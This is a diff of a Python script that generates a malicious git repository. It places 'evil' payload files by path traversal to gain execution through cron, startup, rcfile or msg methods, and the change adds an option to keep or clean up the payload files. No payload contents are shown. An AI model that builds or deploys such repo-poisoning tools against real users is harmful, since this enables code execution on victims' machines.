@@ -72,13 +72,13 @@ def evilFileGenerator(base,locations):
 
 def badRepoGenerator( username :str,outputDirName="test",
                       badfileName=".evilcodeExec",atPath="../",
-                      fuckMethod="rcfile" ,os = "linux"):
+                      fuckMethod="rcfile" ,os = "linux",clean = False):
 
     assert outputDirName not in [ "","/" ]
 
     path = "./"
     workingDirectory = path + outputDirName
-    print("[+] Generate ",end = "")
+    print("[+] Generate bad repo ")
 
     badRepo = Repo.init( path=workingDirectory,mkdir=True )
 
@@ -142,7 +142,8 @@ def badRepoGenerator( username :str,outputDirName="test",
     badRepo.index.commit("Evil Generated!")
     print("[+] Generate Repo successfully")
 
-    cleanFiles(evilPayloadBaseDir,evilPayloadLocation)
+    if clean:
+        cleanFiles(evilPayloadBaseDir,evilPayloadLocation)
 
 
 # def argcheck(obj):
@@ -163,15 +164,17 @@ def main():
     praser.add_argument("-m","--method",help="attack method [ cron, start, rcfile, msg ] ",default="rcfile",choices=["cron","start","rcfile","msg"])
     praser.add_argument("-B","--badfilename",help="badfile in cron mode name",default=".evilcode")
     praser.add_argument("-p","--atpath",help="bad file you want located at path such as ../../../ ")
-
+    praser.add_argument("-c","--clean",help="it will used like file clean to delete file we generate or overwrite add it to confirm",action="store_true")
     arg = praser.parse_args()
+    print(arg)
     # argcheck(arg)
     badRepoGenerator(username=arg.user,
                      outputDirName=arg.outputDirectoryName,
                      badfileName=arg.badfilename,
                      fuckMethod=arg.method,
                      os=arg.os,
-                     atPath=arg.atpath
+                     atPath=arg.atpath,
+                     clean=arg.clean
                      )
 
 
